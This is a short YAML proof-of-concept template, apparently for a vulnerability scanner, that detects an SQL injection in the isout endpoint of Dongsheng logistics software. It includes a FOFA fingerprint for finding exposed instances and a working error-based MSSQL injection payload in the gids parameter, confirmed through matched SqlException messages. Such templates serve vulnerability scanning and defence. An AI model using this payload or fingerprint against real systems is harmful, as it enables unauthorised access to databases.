id: poc-yaml-dongshengsoft-isout-sqli
info:
  name: 东胜物流软件 isout SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 东胜物流软件
  fofa: app="东胜物流软件-物流软件"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /WMS_ZX/WmsZXFeeGridSource.aspx?read=isout&gids=1')+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--
  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SqlException")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
